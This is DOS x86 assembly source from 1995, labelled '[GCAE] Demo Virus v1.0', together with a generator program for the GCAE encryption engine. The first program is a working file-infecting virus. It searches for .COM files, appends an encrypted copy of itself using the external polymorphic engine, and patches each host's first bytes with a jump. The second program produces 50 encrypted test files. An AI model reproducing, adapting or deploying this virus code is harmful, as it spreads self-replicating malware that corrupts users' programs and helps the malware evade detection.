;       This is [GCAE] Demo Virus v1.0
;  Written by Golden Cicada in Taipei, Taiwan.
;      (C) Copyright CVEX Corp. , 1995.

        .286
        .model  small
        .code

        extrn   GCAE:near,GCAE_E:near

start:
        jmp short begin

wrt_dat db 0aeh,0e9h
jmp_addr dw ?
head_dat db 4h dup(?)
find_name db '*.COM',00h
dta_buf db 30h dup(?)

begin:
        call get_adr
get_adr:
        pop si
        sub si,OFFSET get_adr
        mov di,si
        and di,0fff0h
        mov ax,di
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        push ax
        mov ax,OFFSET retf_to
        push ax
        mov cx,OFFSET GCAE_E
        cld
        rep movsb
        retf
retf_to:
        push cs
        pop ds
        mov si,OFFSET head_dat
        xor di,di
        cmp BYTE PTR head_dat,00h
        jz first
        mov di,0100h
        push di
        movsw                           ;
        movsw                           ;
        pop di
first:
        push es                         ;
        push di
        push es
        mov ah,1ah
        mov dx,OFFSET dta_buf
        int 21h
        mov si,0003h                    ;
        mov ah,4eh
        mov cx,0003h
        mov dx,OFFSET find_name
        int 21h
        jnc to_infect
        jmp short find_end
find_loop:
        mov ah,4fh
        int 21h
        jc find_end
to_infect:
        call infect                     ;
        dec si
        jnz find_loop
find_end:
        pop es                          ;
        push es
        pop ds
        mov dx,80h
        mov ah,1ah
        int 21h
        retf                            ;

infect  proc
        mov dx,OFFSET dta_buf+1eh
        mov ax,3d02h
        int 21h                         ;
        xchg bx,ax
        mov ah,3fh
        mov cx,0004h
        mov dx,OFFSET head_dat
        int 21h                         ;
        inc si
        cmp BYTE PTR head_dat,0aeh
        je close_file
        dec si
        push si
        xor cx,cx
        xor dx,dx
        mov ax,4202h                    ;
        int 21h
        push bx
        mov bx,ax
        add bx,0100h                    ;
        sub ax,0004h
        mov jmp_addr,ax
        mov ax,OFFSET GCAE_E+0fh
        mov cl,04h
        shr ax,cl
        mov cx,cs
        add ax,cx
        mov es,ax
        mov cx,OFFSET GCAE_E            ;
        mov dx,OFFSET start
        call GCAE                       ;
        pop bx
        mov ah,40h
        int 21h                         ;
        push cs
        pop ds
        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,0004h
        mov dx,OFFSET wrt_dat
        int 21h
        pop si
close_file:
        mov ah,3eh                      ;
        int 21h
        ret
infect  endp

        end start

;          This is [GCAE] GEN v1.0
;  Written by Golden Cicada in Taipei, Taiwan.
;      (C) Copyright CVEX Corp. , 1995.

        .286
        .model  small
        .code
        extrn GCAE:near,GCAE_E:near

msg_addr equ OFFSET msg-OFFSET proc_start-3

        org 0100h
start:
        mov ah,09h
        mov dx,OFFSET gen_msg
        int 21h
        mov ax,OFFSET GCAE_E+000fh
        shr ax,4
        mov bx,cs
        add bx,ax
        mov es,bx
        mov cx,50
gen_l1:
        push cx
        mov ah,3ch
        xor cx,cx
        mov dx,OFFSET file_name
        int 21h
        xchg bx,ax
        mov cx,OFFSET proc_end-OFFSET proc_start
        mov dx,OFFSET proc_start
        push bx
        mov bx,0100h
        call GCAE
        pop bx
        mov ah,40h
        int 21h
        mov ah,3eh
        int 21h
        push cs
        pop ds
        mov bx,OFFSET file_no
        inc BYTE PTR ds:[bx+0001h]
        cmp BYTE PTR ds:[bx+0001h],'9'
        jbe gen_l2
        inc BYTE PTR ds:[bx]
        mov BYTE PTR ds:[bx+0001h],'0'
gen_l2:
        pop cx
        loop gen_l1
        mov ah,4ch
        int 21h

file_name db 'T'
file_no db '00.COM',00h
gen_msg db 0dh,0ah,'Generates 50 [GCAE] encrypted test files...',0dh,0ah,'$'

proc_start:
        call $+0003h
        pop dx
        add dx,msg_addr
        mov ah,09h
        int 21h
        int 20h
msg db 'Hi!This is a [GCAE] test file!$'
proc_end:

         end start
         